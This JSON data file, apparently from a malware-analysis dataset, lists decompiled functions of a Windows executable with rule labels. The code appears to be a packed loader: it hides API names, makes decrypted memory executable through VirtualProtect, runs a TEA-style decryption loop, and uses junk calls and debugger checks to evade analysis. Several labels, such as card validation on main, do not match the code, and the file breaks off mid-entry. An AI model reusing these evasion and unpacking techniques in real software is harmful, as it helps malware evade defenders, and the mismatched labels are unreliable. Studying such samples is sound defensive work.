{
    "00402fd0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00402fd0(uint32_t *param_1, uint32_t param_2)\n\n{\n    *param_1 = *param_1 ^ param_2;\n    return;\n}\n",
        "token_count": 44
    },
    "00403000": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\nvoid fcn.00403000(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t extraout_EDX;\n    uint32_t uVar3;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    uint32_t unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *unaff_retaddr;\n    \n    iVar5 = *param_1;\n    iVar1 = *(param_2 + 4);\n    piVar2 = *(param_2 + 8);\n    iVar6 = -0x3910c8e0;\n    iVar4 = 0x20;\n    do {\n        param_2 = piVar2 + iVar5 * 4;\n        *0x94ad8c = 0xffcf03fc;\n        fcn.00402fd0(&param_2, iVar6 + iVar5);\n        unaff_EBP = unaff_EBP ^ unaff_retaddr;\n        *0x94ad8c = 0;\n        uVar3 = extraout_EDX - unaff_EBP;\n        unaff_retaddr = piVar2 + uVar3 * 4;\n        iVar5 = iVar5 - (unaff_retaddr ^ iVar6 + uVar3 ^ (uVar3 >> 5) + iVar1);\n        *0x94ad90 = 0xff6b3619;\n        *0x94ad94 = 0xffffffff;\n        iVar6 = unaff_ESI;\n        fcn.00402f80();\n        iVar4 = iVar4 + -1;\n        unaff_ESI = iVar6;\n    } while (iVar4 != 0);\n    *piVar2 = iVar5;\n    piVar2[1] = extraout_EDX_00;\n    return;\n}\n",
        "token_count": 424
    },
    "00403100": {
        "rules": [
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0"
        ],
        "decompiled_code": "\nvoid fcn.00403100(uint param_1, uint32_t param_2)\n\n{\n    for (param_2 = param_2 >> 3; param_2 != 0; param_2 = param_2 - 1) {\n        fcn.00403000();\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00403270": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\nvoid fcn.00403270(void)\n\n{\n    uint uStack144;\n    uint uStack140;\n    \n    uStack140 = 0x80bca8;\n    *0x80bcac = 0x65;\n    *0x80bcad = 0x336c;\n    *0x80bcaf = 0x6c642e32;\n    *0x80bcb3 = 0x6c;\n    *0x80bca8 = 0x6e72656b;\n    *0x80bcb4 = *0x80bcb4 & 0xff00;\n    uStack144 = 0x4032a7;\n    *0x94b2a0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    uStack144 = 0x80bca8;\n    *0x80bcb3 = 0x65;\n    *0x80bcac = 0x75;\n    *0x80bcad = 0x6c61;\n    *0x80bca8 = 0x74726956;\n    *0x80bcb4 = 0x7463;\n    *0x80bcb6 = 0;\n    *0x80bcaf = 0x746f7250;\n    *0x80bca4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x94b2a0);\n    (**0x80bca4)(*0x94ad88, *0x94b2a4, 0x40, &stack0xffffff70);\n    return;\n}\n",
        "token_count": 352
    },
    "004036e0": {
        "rules": [
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004036e0(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    code *pcVar7;\n    uint32_t uVar8;\n    int32_t unaff_ESI;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t iStack24;\n    \n    fcn.00403b20();\n    pcVar1 = _sym.imp.KERNEL32.dll_UnhandledExceptionFilter;\n    iVar9 = 0;\n    do {\n        if (iVar9 == 0x13b4) {\n            *0x94b2a4 = *0x94b2a4 + 0x38d6;\n        }\n        if (*0x94b2a4 == 0xdcc) {\n            (*pcVar1)();\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x31aa3a);\n    *0x94ad88 = (*_sym.imp.KERNEL32.dll_LocalAlloc)();\n    pcVar4 = _sym.imp.KERNEL32.dll_EnumCalendarInfoW;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetFileInformationByHandle;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetShortPathNameA;\n    pcVar1 = _sym.imp.KERNEL32.dll_FoldStringW;\n    iVar9 = 0x962aca;\n    uVar10 = *0x94b2a4;\n    do {\n        if (uVar10 == 3) {\n            (*_sym.imp.KERNEL32.dll_FindNextFileA)();\n            uVar10 = *0x94b2a4;\n        }\n        if (uVar10 == 0xd) {\n            (*pcVar4)();\n            (*pcVar3)();\n            (*pcVar4)();\n            (*pcVar2)();\n            (*pcVar1)();\n            uVar10 = *0x94b2a4;\n        }\n        pcVar7 = _sym.imp.KERNEL32.dll_WritePrivateProfileStringW;\n        pcVar6 = _sym.imp.KERNEL32.dll_FreeUserPhysicalPages;\n        pcVar5 = _sym.imp.KERNEL32.dll_FatalAppExitW;\n        iVar9 = iVar9 + -1;\n    } while (iVar9 != 0);\n    uVar8 = 0;\n    if (uVar10 != 0) {\n        do {\n            if (uVar10 == 0xfe) {\n                (*pcVar7)();\n                (*pcVar6)();\n                (*pcVar5)();\n            }\n            fcn.00403130();\n            uVar8 = uVar8 + 1;\n            uVar10 = *0x94b2a4;\n        } while (uVar8 < *0x94b2a4);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    if (uVar10 == 0x19c) {\n        (*_sym.imp.KERNEL32.dll_DeleteVolumeMountPointA)();\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)();\n        (*_sym.imp.KERNEL32.dll_GetComputerNameW)();\n        (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)();\n        (*pcVar1)();\n        (*_sym.imp.KERNEL32.dll_SetVolumeMountPointA)();\n        (*_sym.imp.KERNEL32.dll_SetSystemPowerState)();\n    }\n    *0x94b2a0 = (*pcVar1)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    pcVar1 = _sym.imp.GDI32.dll_GetBoundsRect;\n    uVar10 = 0;\n    do {\n        if (uVar10 < 0x1b9f1) {\n            (*pcVar2)();\n            (*pcVar1)();\n        }\n    } while ((((uVar10 < 0x1ea07c8e) || (unaff_ESI == 0xacc888)) || (param_2 == 0xad669fc)) &&\n            (uVar10 = uVar10 + 1,  uVar10 < 0x8df004e8));\n    *0x80bca8 = 0;\n    fcn.00403270();\n    fcn.00403100();\n    fcn.00403250();\n    pcVar4 = _sym.imp.KERNEL32.dll_WriteProfileSectionW;\n    pcVar3 = _sym.imp.KERNEL32.dll_GetConsoleAliasW;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetComputerNameExW;\n    pcVar1 = _sym.imp.KERNEL32.dll_WriteProfileStringA;\n    iStack24 = 0xdd7b3;\n    do {\n        if (*0x94b2a4 == 0x21) {\n            (*pcVar4)();\n            (*pcVar3)();\n            (*pcVar2)();\n            (*pcVar1)();\n            (*_sym.imp.KERNEL32.dll_LocalSize)();\n        }\n        iStack24 = iStack24 + -1;\n    } while (iStack24 != 0);\n    fcn.00402f40();\n    *0x80bca9 = 0x73;\n    if (*0x94b2a4 == 0x58c) {\n        (*_sym.imp.KERNEL32.dll_GetBinaryTypeA)();\n        (*_sym.imp.KERNEL32.dll_LoadLibraryW)();\n        (*_sym.imp.KERNEL32.dll_EnumResourceTypesA)();\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)();\n    }\n    fcn.00403240();\n    return 0;\n}\n",
        "token_count": 1246
    },
    "00405abb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405abb(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x94b710, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.004058bb();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.00405879(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "00408659": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040875f: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00408764)\n// WARNING: Removing unreachable block (ram,0x00408793)\n// WARNING: Removing unreachable block (ram,0x0040876a)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408659(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406000(0x420d10, 0x20);\n    fcn.00409537(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x94b74c != 1) {\n        *0x94b748 = 1;\n        *0x94b744 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x94c44c);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x94c448);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.004051b3();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.004051b3();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x94c44c);\n                        piVar2 = (*pcVar1)(*0x94c448);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x4011e0;\n            while (*(unaff_EBP + -0x1c) < 0x4011ec) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x4011f0;\n        while (*(unaff_EBP + -0x20) < 0x4011f4) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040945e(8);\n    }\n    return;\n}\n",
        "token_count": 1016
    },
    "004093ae": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004093ae(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x80b9a8) {\n        return;\n    }\n    *0x94c230 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x94c234 = &arg_8h;\n    *0x94c170 = 0x10001;\n    *0x94c118 = 0xc0000409;\n    *0x94c11c = 1;\n    var_328h = *0x80b9a8;\n    var_324h = *0x80b9ac;\n    *0x94c124 = unaff_retaddr;\n    *0x94c1fc = in_GS;\n    *0x94c200 = in_FS;\n    *0x94c204 = in_ES;\n    *0x94c208 = in_DS;\n    *0x94c20c = unaff_EDI;\n    *0x94c210 = unaff_ESI;\n    *0x94c214 = unaff_EBX;\n    *0x94c218 = in_EDX;\n    *0x94c21c = in_ECX;\n    *0x94c220 = in_EAX;\n    *0x94c224 = unaff_EBP;\n    *0x94c228 = unaff_retaddr;\n    *0x94c22c = in_CS;\n    *0x94c238 = in_SS;\n    *0x94c168 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00409b79(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402e48);\n    if (*0x94c168 == 0) {\n        fcn.00409b79(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 835
    },
    "0040b7e7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0040b7e7(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040945e(0);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "0040b97b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040b97b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x80b9a8 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.004051b3();\n    var_14h = 0;\n    if (*0x94c104 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x402e30);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x402e24), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040bad8;\n        *0x94c104 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x402e14);\n        *0x94c108 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x402e00);\n        *0x94c10c = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x402de4);\n        *0x94c114 = (*pcVar4)(uVar3);\n        if (*0x94c114 != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x402dcc);\n            *0x94c110 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x94c110 == var_18h) || (*0x94c114 == var_18h)) {\ncode_r0x0040ba87:\n        if ((((*0x94c108 != var_18h) && (pcVar4 = (*pcVar6)(*0x94c108),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x94c10c != var_18h && (pcVar4 = (*pcVar6)(*0x94c10c),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x94c110);\n        pcVar5 = (*pcVar6)(*0x94c114);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040ba87;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x94c104);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040bad8:\n    fcn.004093ae(unaff_EBX);\n    return;\n}\n",
        "token_count": 938
    },
    "004063cf": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004063cf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406000(0x420cf0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004058ce();\n        *puVar2 = 0;\n        puVar2 = fcn.004058bb();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x94c45c)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x94c460;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040a10f(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004058bb();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004058ce();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040635a(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040649b();\n                goto code_r0x00406492;\n            }\n        }\n        puVar2 = fcn.004058ce();\n        *puVar2 = 0;\n        puVar2 = fcn.004058bb();\n        *puVar2 = 9;\n        fcn.00405869();\n    }\ncode_r0x00406492:\n    fcn.00406045();\n    return;\n}\n",
        "token_count": 600
    },
    "0040a8d2": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a8d2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406000(0x420d70, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004058ce();\n        *puVar2 = 0;\n        puVar2 = fcn.004058bb();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x94c45c)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x94c460;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040a10f(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004058bb();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004058ce();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040a1d5(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040a99e();\n                goto code_r0x0040a995;\n            }\n        }\n        puVar2 = fcn.004058ce();\n        *puVar2 = 0;\n        puVar2 = fcn.004058bb();\n        *puVar2 = 9;\n        fcn.00405869();\n    }\ncode_r0x0040a995:\n    fcn.00406045();\n    return;\n}\n",
        "token_count": 608
    },
    "00403130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403130(int32_t param_1)\n\n{\n    code *pcVar1;\n    uchar *puStack4064;\n    uint uStack4060;\n    uchar *puStack4056;\n    uchar *puStack4052;\n    uint uStack4048;\n    uint uStack4044;\n    uchar *puStack4040;\n    uint uStack4036;\n    uint uStack4032;\n    uint uStack4028;\n    uchar *puStack4024;\n    uint uStack4020;\n    uchar *puStack4016;\n    uchar *puStack4012;\n    uint uStack4008;\n    uint uStack4004;\n    uint uStack4000;\n    uint uStack3996;\n    uint uStack3992;\n    uchar *puStack3988;\n    uint uStack3984;\n    uint uStack3980;\n    uint uStack3976;\n    uint uStack3972;\n    uint uStack3968;\n    uint uStack3964;\n    uint uStack3960;\n    uchar auStack3940 [296];\n    uchar auStack3644 [484];\n    uchar auStack3160 [1036];\n    uchar auStack2124 [1996];\n    int32_t iStack128;\n    \n    if (*0x94b2a4 == 0x37) {\n        uStack3960 = 0x401220;\n        uStack3964 = 0;\n        uStack3968 = 0;\n        uStack3972 = 0x403153;\n        (*_sym.imp.KERNEL32.dll_SetLocaleInfoA)();\n        uStack3972 = 0;\n        uStack3976 = 0;\n        uStack3980 = 0;\n        uStack3984 = 0;\n        puStack3988 = 0x403161;\n        (*_sym.imp.KERNEL32.dll_CreateEventW)();\n        puStack3988 = &stack0xfffff1c4;\n        uStack3992 = 0;\n        uStack3996 = 0;\n        uStack4000 = 0x403173;\n        (*_sym.imp.KERNEL32.dll_GetCPInfoExW)();\n        uStack4000 = 0;\n        uStack4004 = 0;\n        uStack4008 = 0;\n        puStack4012 = &stack0xfffff09c;\n        puStack4016 = 0x403184;\n        (*_sym.imp.KERNEL32.dll_VerifyVersionInfoW)();\n        pcVar1 = _sym.imp.KERNEL32.dll_ReadConsoleInputA;\n        puStack4016 = &stack0xfffff05c;\n        uStack4020 = 0;\n        puStack4024 = &stack0xfffff078;\n        uStack4028 = 0;\n        uStack4032 = 0x40319a;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleInputA)();\n        uStack4032 = 0;\n        uStack4036 = 0x4031a2;\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)();\n        uStack4036 = 0;\n        puStack4040 = &stack0xfffff7b4;\n        uStack4044 = 0x401230;\n        uStack4048 = 0x4031b7;\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeMountPointW)();\n        uStack4048 = 0;\n        puStack4052 = &stack0xfffff3a8;\n        puStack4056 = 0x4031c7;\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)();\n        puStack4056 = &stack0xfffff038;\n        uStack4060 = 0;\n        puStack4064 = &stack0xfffff03c;\n        (*pcVar1)(0);\n        (*_sym.imp.KERNEL32.dll_GetStringTypeExA)(0, 0, 0x401248, 0, &stack0xfffff020);\n        *(*0x94ad88 + iStack128) = *(*0x94b6b8 + 0x38d6 + iStack128);\n        return;\n    }\n    *(*0x94ad88 + param_1) = *(*0x94b6b8 + 0x38d6 + param_1);\n    return;\n}\n",
        "token_count": 927
    },
    "00403250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403250(void)\n\n{\n    return;\n}\n",
        "token_count": 15
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uchar auStack716 [716];\n    \n    if (*0x94b2a4 == 0x422) {\n        fcn.00404539(0, 0);\n        fcn.00404539(0, 0x4015fc);\n        fcn.0040451c(0, 0);\n        fcn.0040451c(0x80bca8, 0);\n        fcn.0040446c(0, 0);\n        fcn.004043ae(0);\n        fcn.0040437e(0);\n        fcn.00404539(0x80bca8, 0x40160c);\n        fcn.0040433e(0, 0);\n        fcn.00404291(0, 0);\n        fcn.00404269(0);\n        fcn.004041f5(0);\n        fcn.0040416b(0, 0, 0, 0);\n        fcn.00403e9a(0, 0);\n        fcn.00403e6f(0, 0, 0);\n    }\n    pcVar4 = _sym.imp.USER32.dll_GetListBoxInfo;\n    pcVar3 = _sym.imp.USER32.dll_GetMenuInfo;\n    pcVar2 = _sym.imp.USER32.dll_GetCursorInfo;\n    iVar5 = 0x4f4;\n    do {\n        (*pcVar2)(0);\n        (*pcVar3)(0, 0);\n        (*pcVar4)(0);\n        pcVar1 = _sym.imp.KERNEL32.dll_RtlCaptureContext;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x94b2a4 = *0x80adc8;\n    iVar5 = 0x79a863;\n    do {\n        if (*0x94b2a4 == 0x4c5) {\n            (*pcVar1)(auStack716);\n        }\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x94b6b8 = *0x80adbc;\n    fcn.004036e0();\n    return 0;\n}\n",
        "token_count": 527
    },
    "0040449f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040449f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00406000(0x420b98, 0xc);\n    if (*(unaff_EBP + 0xc) == 0) {\n        puVar1 = fcn.004058bb();\n        *puVar1 = 0x16;\n        fcn.00405869();\n    }\n    else {\n        uVar2 = fcn.00405e3f();\n        fcn.00405f57(0, uVar2);\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.00405e3f(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n        uVar2 = (**(unaff_EBP + 8))(uVar2);\n        *(unaff_EBP + -0x1c) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0040450c();\n    }\n    fcn.00406045();\n    return;\n}\n",
        "token_count": 322
    },
    "0040451c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040451c(uint arg_8h, uint arg_ch)\n\n{\n    fcn.0040449f(fcn.0040679f, arg_8h, 0, &arg_ch);\n    return;\n}\n",
        "token_count": 54
    },
    "00404539": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
